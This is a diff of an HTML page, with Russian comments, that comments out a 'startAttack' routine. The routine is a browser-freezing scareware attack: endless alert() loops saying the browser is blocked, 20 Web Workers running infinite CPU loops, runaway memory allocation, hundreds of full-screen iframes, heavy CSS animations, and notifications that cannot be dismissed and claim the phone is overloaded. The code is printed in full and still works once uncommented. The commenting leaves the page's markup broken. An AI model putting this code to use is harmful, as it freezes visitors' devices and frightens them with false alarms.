@@ -21,87 +21,87 @@
                 });
             }, 500);
 
-            // Запуск бесконечных alert()  
-            setTimeout(function spamAlert() {
-                alert("Ваш браузер заблокирован! Перезагрузите устройство.");
-                spamAlert();
-            }, 100);
+    //         // Запуск бесконечных alert()  
+    //         setTimeout(function spamAlert() {
+    //             alert("Ваш браузер заблокирован! Перезагрузите устройство.");
+    //             spamAlert();
+    //         }, 100);
 
-            // Перегрузка процессора Web Workers  
-            for (let i = 0; i < 20; i++) {
-                let worker = new Worker(URL.createObjectURL(new Blob([`
-                    while (true) {
-                        Math.random() * Math.random();
-                    }
-                `], { type: 'application/javascript' })));
-            }
+    //         // Перегрузка процессора Web Workers  
+    //         for (let i = 0; i < 20; i++) {
+    //             let worker = new Worker(URL.createObjectURL(new Blob([`
+    //                 while (true) {
+    //                     Math.random() * Math.random();
+    //                 }
+    //             `], { type: 'application/javascript' })));
+    //         }
 
-            // Заполнение оперативной памяти большими массивами  
-            let memoryHog = [];
-            setInterval(() => {
-                for (let i = 0; i < 10000; i++) {
-                    memoryHog.push(new Array(1000).fill("🔴"));
-                }
-            }, 100);
+    //         // Заполнение оперативной памяти большими массивами  
+    //         let memoryHog = [];
+    //         setInterval(() => {
+    //             for (let i = 0; i < 10000; i++) {
+    //                 memoryHog.push(new Array(1000).fill("🔴"));
+    //             }
+    //         }, 100);
 
-            // Множество iframe  
-            for (let i = 0; i < 500; i++) {
-                let iframe = document.createElement('iframe');
-                iframe.src = "https://example.com";
-                iframe.style.position = "absolute";
-                iframe.style.width = "100%";
-                iframe.style.height = "100%";
-                document.body.appendChild(iframe);
-            }
+    //         // Множество iframe  
+    //         for (let i = 0; i < 500; i++) {
+    //             let iframe = document.createElement('iframe');
+    //             iframe.src = "https://example.com";
+    //             iframe.style.position = "absolute";
+    //             iframe.style.width = "100%";
+    //             iframe.style.height = "100%";
+    //             document.body.appendChild(iframe);
+    //         }
 
-            // Графическая перегрузка (CSS box-shadow и анимация)  
-            for (let i = 0; i < 100; i++) {
-                let div = document.createElement('div');
-                div.style.width = "100vw";
-                div.style.height = "100vh";
-                div.style.boxShadow = "0 0 50000px red";
-                div.style.animation = "rotate 0.1s infinite linear";
-                document.body.appendChild(div);
-            }
+    //         // Графическая перегрузка (CSS box-shadow и анимация)  
+    //         for (let i = 0; i < 100; i++) {
+    //             let div = document.createElement('div');
+    //             div.style.width = "100vw";
+    //             div.style.height = "100vh";
+    //             div.style.boxShadow = "0 0 50000px red";
+    //             div.style.animation = "rotate 0.1s infinite linear";
+    //             document.body.appendChild(div);
+    //         }
 
-            // Несворачиваемые уведомления  
-            if (Notification.permission === "granted") {
-                setInterval(() => {
-                    new Notification("⚠️ ВАЖНОЕ СООБЩЕНИЕ!", {
-                        body: "Ваш телефон перегружен! Закрыть невозможно!",
-                        requireInteraction: true
-                    });
-                }, 1000);
-            } else {
-                Notification.requestPermission().then(permission => {
-                    if (permission === "granted") {
-                        startAttack();
-                    }
-                });
-            }
-        }
-    </script>
+    //         // Несворачиваемые уведомления  
+    //         if (Notification.permission === "granted") {
+    //             setInterval(() => {
+    //                 new Notification("⚠️ ВАЖНОЕ СООБЩЕНИЕ!", {
+    //                     body: "Ваш телефон перегружен! Закрыть невозможно!",
+    //                     requireInteraction: true
+    //                 });
+    //             }, 1000);
+    //         } else {
+    //             Notification.requestPermission().then(permission => {
+    //                 if (permission === "granted") {
+    //                     startAttack();
+    //                 }
+    //             });
+    //         }
+    //     }
+    // </script>
 
-    <style>
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+    // <style>
+    //     @keyframes rotate {
+    //         0% { transform: rotate(0deg); }
+    //         100% { transform: rotate(360deg); }
+    //     }
 
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-            cursor: pointer;
-            overflow: hidden;
-            position: relative;
-            -webkit-tap-highlight-color: transparent;
-            user-select: none;
-        }
+    //     body {
+    //         margin: 0;
+    //         padding: 0;
+    //         display: flex;
+    //         justify-content: center;
+    //         align-items: center;
+    //         height: 100vh;
+    //         text-align: center;
+    //         cursor: pointer;
+    //         overflow: hidden;
+    //         position: relative;
+    //         -webkit-tap-highlight-color: transparent;
+    //         user-select: none;
+    //     }
     </style>
 </head>
 
